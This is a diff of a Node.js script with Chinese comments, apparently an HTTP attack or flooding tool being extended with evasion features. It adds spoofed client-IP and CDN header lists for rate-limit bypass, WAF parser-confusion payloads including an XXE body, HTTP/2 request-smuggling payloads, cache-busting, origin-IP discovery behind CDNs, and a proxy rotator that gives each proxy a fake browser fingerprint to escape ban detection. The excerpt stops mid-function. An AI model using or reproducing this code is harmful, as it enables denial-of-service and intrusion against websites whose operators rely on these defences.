@@ -1,6 +1,6 @@
 'use strict';
 
-// 自动安装依赖
+// ==================== 自动安装依赖 ====================
 const { execSync } = require('child_process');
 let colors;
 try {
@@ -24,61 +24,114 @@ try {
   }
 }
 
-// 颜色主题设置
 if (colors && colors.setTheme) {
   colors.setTheme({
-    info: 'cyan',
-    warn: 'yellow',
-    error: 'red',
-    success: 'green',
-    attack: 'magenta',
-    stats: 'blue',
-    bypass: 'rainbow',
-    random: 'random',
-    method: 'cyan'
+    info: 'cyan', warn: 'yellow', error: 'red', success: 'green',
+    attack: 'magenta', stats: 'blue', bypass: 'rainbow', random: 'random', method: 'cyan'
   });
 }
 
-process.on('uncaughtException', function(err) {
-  console.error(`[${new Date().toISOString()}] \x1b[31m未捕获异常:\x1b[37m`, err.message);
+// 全局错误处理——防止进程静默崩溃
+process.on('uncaughtException', (err) => {
+  console.error(`[${new Date().toISOString()}] \x1b[31m[全局异常]\x1b[37m`, err.message);
 });
-
-process.on('unhandledRejection', function(reason, promise) {
-  console.error(`[${new Date().toISOString()}] \x1b[31m未处理的Promise拒绝:\x1b[37m`, reason);
+process.on('unhandledRejection', (reason) => {
+  console.error(`[${new Date().toISOString()}] \x1b[31m[未处理拒绝]\x1b[37m`, reason?.message || reason);
 });
 
 const net = require('net');
 const http = require('http');
+const http2 = require('http2');
 const https = require('https');
-const url = require('url');
 const fs = require('fs');
 const path = require('path');
 const crypto = require('crypto');
+const dns = require('dns').promises;
+const tls = require('tls');
 
 const fileName = path.basename(__filename);
 
+// ==================== UAs ====================
 const UAs = [
   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
   "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
   "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+  "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
   "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
-  "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
   "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
+  "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.5621.42 Mobile Safari/537.36",
+  "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.5621.42 Mobile Safari/537.36",
   "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
   "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
-  "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
-  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
-  "curl/7.88.1",
-  "Wget/1.21.4",
-  "PostmanRuntime/7.36.3",
 ];
 
+// ==================== 速率限制绕过专用头 ====================
+const RATE_LIMIT_BYPASS_HEADERS = {
+  standard: [
+    'X-Forwarded-For', 'X-Real-IP', 'X-Client-IP', 'X-Originating-IP',
+    'X-Remote-IP', 'X-Remote-Addr', 'X-Cluster-Client-IP', 'X-ProxyUser-Ip',
+  ],
+  cdnSpecific: [
+    'CF-Connecting-IP', 'True-Client-IP', 'X-Azure-ClientIP', 'X-Azure-SocketIP',
+    'Ali-Cdn-Real-Ip', 'Cdn-Src-Ip', 'Cdn-Real-Ip', 'Fastly-Client-Ip',
+    'X-Amz-Cf-Id', 'CloudFront-Viewer-Address',
+  ],
+  misc: [
+    'X-Forwarded', 'X-Forwarded-By', 'X-Forwarded-For-Original',
+    'X-Forwarder-For', 'Forwarded-For', 'Forwarded-For-Ip',
+    'X-Custom-IP-Authorization', 'X-ProxyUser-Ip', 'Client-IP',
+    'X-Original-URL', 'X-Forwarded-Host',
+  ]
+};
+
+// ==================== WAFFLED解析差异负载 ====================
+const WAFFLED_PAYLOADS = {
+  multipartBypasses: [
+    { boundary: '--boundary1; boundary=--boundary2' },
+    { boundary: ' --boundary' },
+    { boundary: '"boundary"' },
+    { boundary: 'BOUNDARY' },
+    { boundary: 'boundary\t' },
+    { boundary: '; boundary=real_boundary' },
+  ],
+  jsonBypasses: [
+    { body: '{"action":"benign","action":"malicious"}' },
+    { body: '{"action":/*comment*/"malicious"}' },
+    { body: '{"action":"malicious",}' },
+    { body: "{'action':'malicious'}" },
+  ],
+  xmlBypasses: [
+    { body: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "malicious">]><root>&xxe;</root>' },
+    { body: '<?xml version="1.1"?><root>malicious</root>' },
+  ],
+};
+
+// ==================== HTTP参数污染模板 ====================
+const PARAM_POLLUTION_TEMPLATES = [
+  (baseParams) => {
+    const dup = {};
+    for (const [k, v] of Object.entries(baseParams)) {
+      dup[k] = [v, crypto.randomBytes(3).toString('hex')];
+    }
+    return dup;
+  },
+  (baseParams) => {
+    const encoded = {};
+    for (const [k, v] of Object.entries(baseParams)) {
+      encoded[encodeURIComponent(k)] = encodeURIComponent(v);
+    }
+    return encoded;
+  },
+];
+
+// ==================== 攻击头模板 ====================
 const BYPASS_HEADERS = {
   normal: {
     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7',
+    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-US;q=0.7',
     'Accept-Encoding': 'gzip, deflate, br',
     'Connection': 'keep-alive',
     'Upgrade-Insecure-Requests': '1',
@@ -86,1073 +139,1377 @@ const BYPASS_HEADERS = {
     'Sec-Fetch-Mode': 'navigate',
     'Sec-Fetch-Site': 'none',
     'Sec-Fetch-User': '?1',
+    'Sec-CH-UA': '"Google Chrome";v="120", "Not?A_Brand";v="8", "Chromium";v="120"',
+    'Sec-CH-UA-Mobile': '?0',
+    'Sec-CH-UA-Platform': '"Windows"',
   },
   api: {
     'Accept': 'application/json, text/plain, */*',
     'Content-Type': 'application/json',
     'X-Requested-With': 'XMLHttpRequest',
     'Origin': 'https://www.google.com',
+    'Referer': 'https://www.google.com/',
   },
   mobile: {
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
     'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
-    'Accept-Encoding': 'gzip, deflate',
+    'Accept-Encoding': 'gzip, deflate, br',
     'Upgrade-Insecure-Requests': '1',
     'Sec-Fetch-Dest': 'document',
     'Sec-Fetch-Mode': 'navigate',
     'Sec-Fetch-Site': 'none',
     'Sec-Fetch-User': '?1',
+    'Sec-CH-UA': '"Google Chrome";v="120", "Not?A_Brand";v="8", "Chromium";v="120"',
+    'Sec-CH-UA-Mobile': '?1',
+    'Sec-CH-UA-Platform': '"Android"',
   },
-  legacy: {
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-    'Accept-Language': 'en-us,en;q=0.5',
-    'Accept-Encoding': 'gzip,deflate',
-    'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
-    'Connection': 'keep-alive',
-  }
 };
 
-class EnhancedWAFBypass {
-  constructor(enabled = false, randomSpeedEnabled = false) {
-    this.enabled = enabled;
-    this.randomSpeedEnabled = randomSpeedEnabled;
-    this.techniques = {
-      headerVariation: true,
-      requestDelay: true,
-      pathRandomization: true,
-      methodRotation: true,
-      encodingManipulation: true,
-      fragmentation: true,
-      caseVariation: true,
-      parameterPollution: true,
-      multiMethodAttack: randomSpeedEnabled,
+// ==================== HTTP/2 走私负载 ====================
+const H2_SMUGGLING_PAYLOADS = [
+  {
+    name: 'H2.CL Desync', method: 'POST',
+    pseudoHeaders: { ':method': 'POST', ':path': '/', ':authority': '' },
+    customHeaders: { 'content-length': '0', 'x-ignore': '' },
+    body: 'GET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n',
+  },
+  {
+    name: 'CRLF Header Injection', method: 'GET',
+    pseudoHeaders: { ':method': 'GET', ':path': '/', ':authority': '' },
+    customHeaders: { 'foo': 'bar\r\nTransfer-Encoding: chunked' },
+    body: '',
+  },
+  {
+    name: 'TE Obfuscation', method: 'POST',
+    pseudoHeaders: { ':method': 'POST', ':path': '/api', ':authority': '' },
+    customHeaders: { 'transfer-encoding': 'chunked', 'Transfer-Encoding': 'identity' },
+    body: '0\r\n\r\n',
+  },
+  {
+    name: 'Double Content-Length', method: 'POST',
+    pseudoHeaders: { ':method': 'POST', ':path': '/', ':authority': '' },
+    customHeaders: { 'content-length': '4', 'content-length': '42' },
+    body: 'test',
+  },
+  {
+    name: 'H2.TE Chunked Size Obfuscation', method: 'POST',
+    pseudoHeaders: { ':method': 'POST', ':path': '/api/data', ':authority': '' },
+    customHeaders: { 'transfer-encoding': 'chunked' },
+    body: '0\r\n\r\nSMUGGLED',
+  },
+  {
+    name: 'OPTIONS+Body Smuggling (CVE-2025-54142)', method: 'OPTIONS',
+    pseudoHeaders: { ':method': 'OPTIONS', ':path': '/', ':authority': '' },
+    customHeaders: { 'content-length': '36' },
+    body: 'GET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n',
+  },
+  {
+    name: 'Space Obfuscation in Method', method: 'GET',
+    pseudoHeaders: { ':method': '\x20GET', ':path': '/', ':authority': '' },
+    customHeaders: {},
+    body: '',
+  },
+];
+
+// ==================== 缓存穿透技术 ====================
+const CACHE_BYPASS_TECHNIQUES = {
+  randomQueryParams: () => {
+    const params = [
+      `_t=${Date.now()}`,
+      `_=${Math.random().toString(36).substring(2, 15)}`,
+      `cachebuster=${crypto.randomBytes(4).toString('hex')}`,
+      `nocache=${Math.random()}`,
+      `ts=${Date.now()}${Math.floor(Math.random() * 1000)}`,
+      `r=${Math.floor(Math.random() * 999999)}`,
+    ];
+    return '?' + params[Math.floor(Math.random() * params.length)];
+  },
+  cacheControlHeaders: () => ({
+    'Cache-Control': ['no-cache, no-store, must-revalidate, max-age=0', 'no-cache', 'max-age=0', 'no-store', 'private, no-cache'][Math.floor(Math.random() * 5)],
+    'Pragma': 'no-cache',
+  }),
+  methodOverride: () => {
+    const overrides = [
+      { 'X-HTTP-Method-Override': 'POST' },
+      { 'X-HTTP-Method': 'PUT' },
+      { 'X-HTTP-Method-Override': 'DELETE' },
+    ];
+    return overrides[Math.floor(Math.random() * overrides.length)];
+  },
+  encodingVariation: () => ({
+    'Accept-Encoding': ['identity', 'gzip;q=0, deflate;q=0', '*;q=0'][Math.floor(Math.random() * 3)],
+  }),
+};
+
+// ==================== 动态回源负载 ====================
+const ORIGIN_PULL_PATHS = [
+  '/api/v1/user/profile', '/api/v2/data/query', '/api/search', '/api/auth/token',
+  '/api/orders/recent', '/api/products/list', '/api/notifications', '/api/settings',
+  '/api/dashboard', '/api/analytics', '/graphql', '/api/graphql', '/query',
+  '/api/v1/login', '/api/v1/payments', '/api/v2/users', '/ws',
+];
+
+const ORIGIN_PULL_QUERIES = [
+  { q: crypto.randomBytes(4).toString('hex') },
+  { search: crypto.randomBytes(4).toString('hex') },
+  { id: Math.floor(Math.random() * 99999) },
+  { page: Math.floor(Math.random() * 100), limit: 20 },
+  { token: crypto.randomBytes(8).toString('hex') },
+  { timestamp: Date.now() },
+];
+
+// ==================== CDN穿透引擎 ====================
+class AdvancedCDNBypassEngine {
+  constructor(domain) {
+    this.domain = domain;
+    this.discoveredIPs = new Set();
+    this.originIP = null;
+  }
+
+  async queryCT() {
+    return new Promise(resolve => {
+      const req = https.get(`https://crt.sh/?q=%25.${encodeURIComponent(this.domain)}&output=json`, { timeout: 8000 }, res => {
+        let data = '';
+        res.on('data', chunk => data += chunk);
+        res.on('end', () => {
+          try {
+            JSON.parse(data).forEach(cert => {
+              const name = cert.name_value || cert.common_name || '';
+              if (/^\d+\.\d+\.\d+\.\d+$/.test(name) && !this.isCDNIP(name)) this.discoveredIPs.add(name);
+            });
+          } catch(e) {}
+          resolve();
+        });
+      });
+      req.on('error', () => resolve());
+      req.on('timeout', () => { req.destroy(); resolve(); });
+    });
+  }
+
+  async huntSubdomains() {
+    const subs = ['www','mail','ftp','admin','test','dev','staging','api','app','blog','direct','origin','backend','server','web','portal','m','mobile','beta','vpn','cpanel','whm','webmail','owa','secure','shop','store','s1','s2','cdn','media','static','assets'];
+    for (const sub of subs) {
+      try {
+        const addrs = await dns.resolve4(`${sub}.${this.domain}`);
+        for (const ip of addrs) { if (!this.isCDNIP(ip)) this.discoveredIPs.add(ip); }
+      } catch(e) {}
+    }
+  }
+
+  isCDNIP(ip) {
+    const ranges = [
+      '103.21.244','103.22.200','103.31.4',
+      '104.16','104.17','104.18','104.19','104.20','104.21','104.22','104.23','104.24','104.25','104.26','104.27','104.28','104.29','104.30','104.31',
+      '23.227.38','13.32','13.33','13.35',
+      '205.185.208','205.185.216','151.101',
+      '2.16','2.17','2.18','2.19','2.20','2.21','2.22','2.23',
+    ];
+    return ranges.some(r => ip.startsWith(r));
+  }
+
+  async verifyOrigin(ip) {
+    return new Promise(resolve => {
+      const req = https.get({
+        hostname: ip, port: 443, path: '/', timeout: 5000,
+        rejectUnauthorized: false, servername: this.domain,
+        headers: { 'Host': this.domain, 'User-Agent': 'Mozilla/5.0' }
+      }, res => {
+        const cdnHdrs = ['cf-ray','x-cache','x-amz-cf-id','x-akamai-transformed','cf-cache-status','x-cache-hits','x-served-by'];
+        resolve(!cdnHdrs.some(h => res.headers[h]));
+      });
+      req.on('error', () => resolve(false));
+      req.on('timeout', () => { req.destroy(); resolve(false); });
+    });
+  }
+
+  async run() {
+    console.log(`\n\x1b[35m[CDN穿透]\x1b[37m 探测 ${this.domain} 的源站IP...`);
+    await Promise.all([this.queryCT(), this.huntSubdomains()]);
+    if (this.discoveredIPs.size === 0) { console.log(`  \x1b[33m[!]\x1b[37m 未发现`); return null; }
+    console.log(`  \x1b[33m[*]\x1b[37m 发现 ${this.discoveredIPs.size} 个疑似IP，验证中...`);
+    for (const ip of this.discoveredIPs) {
+      if (await this.verifyOrigin(ip)) {
+        this.originIP = ip;
+        console.log(`  \x1b[32m[+]\x1b[37m ✅ 确认源站IP: ${ip}`);
+        return ip;
+      }
+    }
+    console.log(`  \x1b[33m[!]\x1b[37m 无法确认`);
+    return null;
+  }
+
+  getInjectionHeaders() {
+    const internalIP = () => {
+      const pool = ['127.0.0.1','10.0.0.1','172.16.0.1','192.168.0.1','169.254.169.254','100.100.100.200'];
+      return pool[Math.floor(Math.random() * pool.length)];
     };
-    
-    this.httpMethods = ['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS', 'PATCH', 'TRACE', 'CONNECT'];
-    this.methodWeights = {
-      'GET': 0.35,
-      'POST': 0.25,
-      'PUT': 0.10,
-      'DELETE': 0.10,
-      'HEAD': 0.08,
-      'OPTIONS': 0.05,
-      'PATCH': 0.04,
-      'TRACE': 0.02,
-      'CONNECT': 0.01
+    return {
+      'X-Forwarded-For': internalIP(), 'X-Real-IP': internalIP(),
+      'CF-Connecting-IP': internalIP(), 'True-Client-IP': internalIP(),
+      'X-Originating-IP': internalIP(), 'X-Remote-IP': internalIP(),
+      'X-Client-IP': internalIP(), 'Ali-Cdn-Real-Ip': internalIP(),
+      'Via': '1.1 google', 'CDN-Loop': 'cloudflare',
     };
+  }
+}
+
+// ==================== 智能代理调度引擎 v3.0 ====================
+
+class SmartProxyManager {
+  constructor(proxies = [], options = {}) {
+    // 代理池初始化（增强元数据）
+    this.proxies = proxies.map(p => {
+      if (typeof p === 'string') {
+        const parts = p.trim().split(':');
+        return {
+          host: parts[0],
+          port: parseInt(parts[1]) || 80,
+          protocol: parts.length > 2 ? parts[2] : 'http',
+          // 核心：每个代理绑定独立的行为指纹
+          fingerprint: this._generateUniqueFingerprint(),
+          // 状态跟踪
+          failures: 0,
+          successes: 0,
+          score: 100,
+          lastUsed: 0,
+          lastFailed: 0,
+          cooldownUntil: 0,
+          // 请求分布
+          requestsSent: 0,
+          avgResponseTime: 0,
+          // 地理/ASN伪装标记
+          geoTag: this._randomGeoTag(),
+        };
+      }
+      return { ...p, fingerprint: p.fingerprint || this._generateUniqueFingerprint() };
+    });
+
+    // 调度策略
+    this.strategy = options.strategy || 'adaptive'; // 'adaptive' | 'round-robin' | 'lowest-load' | 'geographic'
+    this.cooldownMs = options.cooldownMs || 30000;
+    this.maxConsecutiveFailures = options.maxConsecutiveFailures || 3;
+    this.consecutiveFailures = new Map();
     
-    this.methodSpecificHeaders = {
-      'POST': {
-        'Content-Type': 'application/x-www-form-urlencoded',
-        'Content-Length': '0'
-      },
-      'PUT': {
-        'Content-Type': 'application/json',
-        'Content-Length': '0'
-      },
-      'PATCH': {
-        'Content-Type': 'application/json-patch+json',
-        'Content-Length': '0'
-      },
-      'DELETE': {
-        'Content-Type': 'application/json'
+    // 全局速率控制
+    this.globalRateLimit = options.globalRateLimit || 0; // 0 = 无限制
+    this.minRequestInterval = options.minRequestInterval || 100; // 同一代理最小请求间隔(ms)
+    
+    // 会话绑定：同一"用户"会话内保持同一代理
+    this.sessionBindings = new Map(); // sessionId -> proxy
+    this.sessionIdCounter = 0;
+    
+    // 统计
+    this.stats = {
+      totalRequests: 0,
+      totalFailures: 0,
+      proxySwitches: 0,
+      bansDetected: 0,
+    };
+
+    console.log(`\x1b[36m[代理引擎]\x1b[37m 初始化完成: ${this.proxies.length}个代理 | 策略:${this.strategy} | 每个代理绑定独立指纹`);
+  }
+
+  /**
+   * 为每个代理生成独立的行为指纹
+   * 这是绕过WAF关联检测的核心
+   */
+  _generateUniqueFingerprint() {
+    const osPool = ['Windows NT 10.0', 'Windows NT 10.0', 'Macintosh; Intel Mac OS X 10_15_7', 'X11; Linux x86_64', 'iPhone; CPU iPhone OS 17_2', 'Linux; Android 14'];
+    const browserPool = [
+      { name: 'Chrome', version: '120.0.0.0', engine: 'AppleWebKit/537.36' },
+      { name: 'Firefox', version: '120.0', engine: 'Gecko/20100101' },
+      { name: 'Edge', version: '119.0.0.0', engine: 'AppleWebKit/537.36' },
+      { name: 'Safari', version: '17.2', engine: 'AppleWebKit/605.1.15' },
+    ];
+    const languagePool = ['zh-CN,zh;q=0.9', 'en-US,en;q=0.9', 'zh-TW,zh;q=0.9', 'ja-JP,ja;q=0.9', 'ko-KR,ko;q=0.9'];
+    const screenPool = ['1920x1080', '2560x1440', '1440x900', '1366x768', '375x812', '390x844'];
+
+    return {
+      os: osPool[Math.floor(Math.random() * osPool.length)],
+      browser: browserPool[Math.floor(Math.random() * browserPool.length)],
+      language: languagePool[Math.floor(Math.random() * languagePool.length)],
+      screen: screenPool[Math.floor(Math.random() * screenPool.length)],
+      timezone: `UTC${Math.random() > 0.5 ? '+' : '-'}${Math.floor(Math.random() * 12)}`,
+      // 用于构建唯一UA
+      getUA: function() {
+        return `Mozilla/5.0 (${this.os}) ${this.engine || 'AppleWebKit/537.36'} (KHTML, like Gecko) ${this.browser.name}/${this.browser.version} Safari/537.36`;
       }
     };
   }
-  
-  getRandomDelay() {
-    if (!this.enabled) return 0;
-    return Math.random() * 200;
+
+  _randomGeoTag() {
+    const geos = ['US', 'CN', 'JP', 'KR', 'DE', 'UK', 'FR', 'BR', 'IN', 'SG'];
+    return geos[Math.floor(Math.random() * geos.length)];
   }
-  
-  getRandomMethod(preferredMethod = 'GET') {
-    if (!this.enabled || !this.techniques.methodRotation) {
-      return preferredMethod;
+
+  /**
+   * 核心：获取代理（考虑会话绑定）
+   */
+  getProxy(sessionId = null) {
+    // 如果有会话绑定，复用同一代理
+    if (sessionId && this.sessionBindings.has(sessionId)) {
+      const bound = this.sessionBindings.get(sessionId);
+      if (bound.score > 0 && Date.now() < bound.cooldownUntil) {
+        return bound;
+      }
     }
+
+    const now = Date.now();
     
-    if (this.techniques.multiMethodAttack) {
-      const rand = Math.random();
-      let cumulative = 0;
-      
-      for (const [method, weight] of Object.entries(this.methodWeights)) {
-        cumulative += weight;
-        if (rand <= cumulative) {
-          return method;
+    // 过滤可用代理
+    const available = this.proxies.filter(p => {
+      // 冷却中
+      if (now < p.cooldownUntil) return false;
+      // 过于频繁
+      if (p.lastUsed && (now - p.lastUsed) < this.minRequestInterval) return false;
+      // 分数太低
+      if (p.score <= 0) return false;
+      return true;
+    });
+
+    // 无可用代理，重置部分代理
+    if (available.length === 0) {
+      console.log(`\x1b[33m[代理警告]\x1b[37m 无可用代理，重置冷却`);
+      this.proxies.forEach(p => {
+        p.cooldownUntil = 0;
+        p.failures = Math.max(0, p.failures - 1);
+        p.score = Math.max(10, p.score);
+      });
+      return this.getProxy(sessionId);
+    }
+
+    let selected;
+
+    switch (this.strategy) {
+      case 'adaptive':
+        // 加权随机选择
+        const totalScore = available.reduce((sum, p) => sum + p.score, 0);
+        let rand = Math.random() * totalScore;
+        for (const p of available) {
+          rand -= p.score;
+          if (rand <= 0) { selected = p; break; }
         }
-      }
+        break;
+
+      case 'lowest-load':
+        // 最少使用代理
+        selected = available.sort((a, b) => a.requestsSent - b.requestsSent)[0];
+        break;
+
+      case 'geographic':
+        // 地理分布均匀
+        const geoCount = {};
+        available.forEach(p => { geoCount[p.geoTag] = (geoCount[p.geoTag] || 0) + 1; });
+        const shuffledGeo = available.sort(() => Math.random() - 0.5);
+        const leastUsedGeo = [...new Set(shuffledGeo.map(p => p.geoTag))].sort((a, b) => (geoCount[a] || 0) - (geoCount[b] || 0))[0];
+        const geoPool = available.filter(p => p.geoTag === leastUsedGeo);
+        selected = geoPool[Math.floor(Math.random() * geoPool.length)];
+        break;
+
+      default:
+        selected = available[Math.floor(Math.random() * available.length)];
+    }
+
+    if (!selected) selected = available[0];
+
+    selected.lastUsed = now;
+    selected.requestsSent++;
+
+    // 建立会话绑定
+    if (sessionId) {
+      this.sessionBindings.set(sessionId, selected);
+    }
+
+    this.stats.totalRequests++;
+    return selected;
+  }
+
+  /**
+   * 获取代理的独立UA（使用绑定的指纹）
+   */
+  getUserAgent(proxy) {
+    return proxy.fingerprint.getUA();
+  }
+
+  /**
+   * 获取代理的独立请求头（使用绑定的指纹）
+   */
+  getProxySpecificHeaders(proxy) {
+    return {
+      'User-Agent': proxy.fingerprint.getUA(),
+      'Accept-Language': proxy.fingerprint.language,
+      'Sec-CH-UA-Platform': `"${proxy.fingerprint.os.split(';')[0]}"`,
+      'Sec-CH-UA-Mobile': proxy.fingerprint.os.includes('iPhone') || proxy.fingerprint.os.includes('Android') ? '?1' : '?0',
+    };
+  }
+
+  /**
+   * 上报结果（自适应评分）
+   */
+  reportResult(proxy, success, responseTime = 0) {
+    if (success) {
+      proxy.successes++;
+      proxy.failures = Math.max(0, proxy.failures - 1);
+      proxy.score = Math.min(100, proxy.score + 5);
+      proxy.avgResponseTime = proxy.avgResponseTime * 0.7 + responseTime * 0.3;
+      
+      const cf = this.consecutiveFailures.get(`${proxy.host}:${proxy.port}`) || 0;
+      this.consecutiveFailures.set(`${proxy.host}:${proxy.port}`, 0);
     } else {
-      const methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'];
-      return Math.random() > 0.8 ? methods[Math.floor(Math.random() * methods.length)] : preferredMethod;
+      proxy.failures++;
+      proxy.score = Math.max(0, proxy.score - 20);
+      proxy.lastFailed = Date.now();
+      
+      const cf = (this.consecutiveFailures.get(`${proxy.host}:${proxy.port}`) || 0) + 1;
+      this.consecutiveFailures.set(`${proxy.host}:${proxy.port}`, cf);
+      
+      if (cf >= this.maxConsecutiveFailures) {
+        proxy.score = 0;
+        proxy.cooldownUntil = Date.now() + this.cooldownMs * (cf - this.maxConsecutiveFailures + 1);
+        this.stats.bansDetected++;
+        console.log(`\x1b[31m[代理封禁检测]\x1b[37m ${proxy.host}:${proxy.port} 连续失败${cf}次，冷却${Math.round((proxy.cooldownUntil - Date.now()) / 1000)}秒`);
+      }
     }
     
+    if (!success) this.stats.totalFailures++;
+  }
+
+  /**
+   * 获取可用代理数量
+   */
+  getAvailableCount() {
+    const now = Date.now();
+    return this.proxies.filter(p => p.score > 0 && now < (p.cooldownUntil || 0)).length;
+  }
+
+  /**
+   * 获取代理池健康状态
+   */
+  getHealthReport() {
+    const total = this.proxies.length;
+    const active = this.proxies.filter(p => p.score >= 50).length;
+    const dead = this.proxies.filter(p => p.score <= 0).length;
+    const avgScore = Math.round(this.proxies.reduce((s, p) => s + p.score, 0) / total);
+    return {
+      total, active, dead, avgScore,
+      bansDetected: this.stats.bansDetected,
+      proxySwitches: this.stats.proxySwitches,
+    };
+  }
+}
+// ==================== 增强版WAF绕过引擎 ====================
+class EnhancedWAFBypass {
+  constructor(options = {}) {
+    this.enabled = options.enabled !== false;
+    this.randomSpeedEnabled = options.randomSpeedEnabled || false;
+    this.cdnHeaders = options.cdnHeaders || {};
+    this.cacheBypassEnabled = options.cacheBypassEnabled || false;
+    this.originPullEnabled = options.originPullEnabled || false;
+    this.rateLimitBypassEnabled = options.rateLimitBypassEnabled !== false;
+    this.waffledEnabled = options.waffledEnabled || false;
+    this.paramPollutionEnabled = options.paramPollutionEnabled || false;
+
+    this.techniques = {
+      headerVariation: this.enabled,
+      pathRandomization: this.enabled,
+      methodRotation: this.enabled,
+      caseVariation: this.enabled,
+      multiMethodAttack: this.randomSpeedEnabled,
+      cdnHeaderInjection: Object.keys(this.cdnHeaders).length > 0,
+      cacheBypass: this.cacheBypassEnabled,
+      originPull: this.originPullEnabled,
+      rateLimitBypass: this.rateLimitBypassEnabled,
+      waffledMultipart: this.waffledEnabled,
+      waffledJSON: this.waffledEnabled,
+      paramPollution: this.paramPollutionEnabled,
+    };
+
+    this.httpMethods = ['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS', 'PATCH'];
+    this.methodWeights = {
+      'GET': 0.30, 'POST': 0.25, 'PUT': 0.12, 'DELETE': 0.10,
+      'HEAD': 0.10, 'OPTIONS': 0.08, 'PATCH': 0.05,
+    };
+    this._rateLimitIPCounter = 0;
+  }
+
+  getRandomMethod(preferredMethod = 'GET') {
+    if (!this.enabled) return preferredMethod;
+    const rand = Math.random();
+    let cumulative = 0;
+    for (const [m, w] of Object.entries(this.methodWeights)) {
+      cumulative += w;
+      if (rand <= cumulative) return m;
+    }
     return preferredMethod;
   }
-  
-  getRandomMethodCombination(count = 3) {
-    if (!this.techniques.multiMethodAttack) {
-      return Array(count).fill('GET');
-    }
-    
-    const methods = [];
-    for (let i = 0; i < count; i++) {
-      methods.push(this.getRandomMethod());
-    }
-    return methods;
-  }
-  
+
   getMethodSpecificBody(method) {
-    if (!['POST', 'PUT', 'PATCH', 'DELETE'].includes(method)) {
-      return '';
+    if (!['POST', 'PUT', 'PATCH'].includes(method)) return '';
+    if (this.techniques.waffledJSON && Math.random() > 0.6) {
+      const payloads = WAFFLED_PAYLOADS.jsonBypasses;
+      return payloads[Math.floor(Math.random() * payloads.length)].body;
     }
-    
-    const bodyTypes = [
-      () => JSON.stringify({
-        id: Math.floor(Math.random() * 10000),
-        timestamp: Date.now(),
-        data: crypto.randomBytes(8).toString('hex')
-      }),
-      () => `action=${crypto.randomBytes(4).toString('hex')}&value=${Math.random()}`,
-      () => `<?xml version="1.0"?><request><id>${Math.floor(Math.random() * 1000)}</id></request>`,
-      () => `{"query":"{user(id:${Math.floor(Math.random() * 100)}){name}}","variables":{}}`,
-      () => `_method=${method}&data=${crypto.randomBytes(6).toString('hex')}`
-    ];
-    
-    return bodyTypes[Math.floor(Math.random() * bodyTypes.length)]();
+    if (this.techniques.waffledMultipart && Math.random() > 0.5) {
+      const bp = WAFFLED_PAYLOADS.multipartBypasses[Math.floor(Math.random() * WAFFLED_PAYLOADS.multipartBypasses.length)];
+      const boundary = bp.boundary.replace('real_boundary', `boundary_${crypto.randomBytes(4).toString('hex')}`);
+      return `--${boundary}\r\nContent-Disposition: form-data; name="data"\r\n\r\n${crypto.randomBytes(8).toString('hex')}\r\n--${boundary}--\r\n`;
+    }
+    return JSON.stringify({ id: Math.floor(Math.random() * 10000), ts: Date.now(), data: crypto.randomBytes(8).toString('hex') });
   }
-  
+
   getRandomPath(originalPath) {
-    if (!this.enabled || !this.techniques.pathRandomization) {
-      return originalPath;
+    if (this.techniques.originPull && Math.random() > 0.4) {
+      const apiPath = ORIGIN_PULL_PATHS[Math.floor(Math.random() * ORIGIN_PULL_PATHS.length)];
+      let query = ORIGIN_PULL_QUERIES[Math.floor(Math.random() * ORIGIN_PULL_QUERIES.length)];
+      if (this.techniques.paramPollution && Math.random() > 0.3) {
